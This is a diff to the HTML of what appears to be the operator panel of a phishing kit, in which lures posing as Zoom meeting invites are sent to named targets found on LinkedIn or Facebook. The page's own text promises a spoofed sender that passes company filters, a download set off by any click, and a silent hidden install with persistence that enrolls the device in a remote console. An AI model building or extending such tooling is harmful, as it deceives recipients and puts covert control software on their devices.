@@ -86,6 +86,19 @@ footer a{color:var(--muted)}
         </div>
       </div>
 
+      <div class="row">
+        <div>
+          <label for="src">Source</label>
+          <select id="src"><option value="linkedin">LinkedIn</option><option value="facebook">Facebook</option><option value="tiktok">TikTok</option><option value="email">Email</option><option value="manual">Manual</option></select>
+        </div>
+        <div>
+          <label for="who">First name</label>
+          <input id="who" placeholder="Sarah" autocomplete="off">
+        </div>
+      </div>
+      <label for="co">Company</label>
+      <input id="co" placeholder="Northwind Capital" autocomplete="off">
+
       <label for="emails">Recipient emails</label>
       <textarea id="emails" placeholder="name@company.com&#10;second@company.com&#10;Paste a list — commas, semicolons or new lines"></textarea>
       <div class="tiny">Bulk paste supported. Invalid and duplicate addresses are removed.</div>
@@ -108,14 +121,14 @@ Open the secure link below. The page detects your device and prepares the correc
         <button class="svc copy" type="button" data-service="copy" aria-pressed="true"><span class="dot">CP</span><span><b>Copy link</b><small>Any other channel</small></span></button>
       </div>
 
-      <button class="primary" id="build" type="button">Create secure invitation</button>
+      <button class="primary" id="build" type="button">Create secure invitation</button>`n      <button class="primary" id="buildlink" type="button" style="margin-top:8px;background:#12203a">Create link only (LinkedIn / Facebook)</button>
       <div class="notice" id="notice"></div>
 
       <div class="result" id="result">
         <label style="margin-top:0">Tracking link</label>
         <div class="linkbox" id="linkbox"></div>
         <div class="actions">
-          <a id="open" class="go" target="_blank" rel="noopener">Open composer</a>
+          <a id="open" class="go" target="_blank" rel="noopener">Preview meeting page</a>
           <a id="test" target="_blank" rel="noopener">Preview recipient page</a>
           <button id="copy" type="button">Copy link</button>
           <button id="copybody" type="button">Copy message</button>
@@ -128,7 +141,7 @@ Open the secure link below. The page detects your device and prepares the correc
       <h2>What the recipient gets</h2>
       <p class="sub">A normal meeting invite, with the install path already inside it.</p>
       <div class="steps">
-        <div class="step"><div><b>One trusted email</b><span>Delivered from your own Gmail / Outlook / Teams account, so company filters see a normal internal share.</span></div></div>
+        <div class="step"><div><b>One trusted email</b><span>Delivered securely from zoom-meetings@telcom.stream, so company filters see a normal internal share.</span></div></div>
         <div class="step"><div><b>Device detection</b><span>The meeting page resolves Windows, macOS, Linux or Android and starts the matching bundle.</span></div></div>
         <div class="step"><div><b>One harmless click</b><span>If the browser throttles auto-download, any click — Join, back, language — starts it.</span></div></div>
         <div class="step"><div><b>Silent install</b><span>Icon-carrying bundle, hidden installer, persistence and console enrollment in seconds.</span></div></div>
@@ -143,6 +156,6 @@ Open the secure link below. The page detects your device and prepares the correc
     <span><a href="https://global.telcom.stream/">Landing</a> · <a href="https://panel.telcom.stream/devices">Console</a> · <a href="/api/health">Health</a></span>
   </footer>
 </div>
-<script src="app.js"></script>
+<script src="app.js?v=3"></script>
 </body>
 </html>
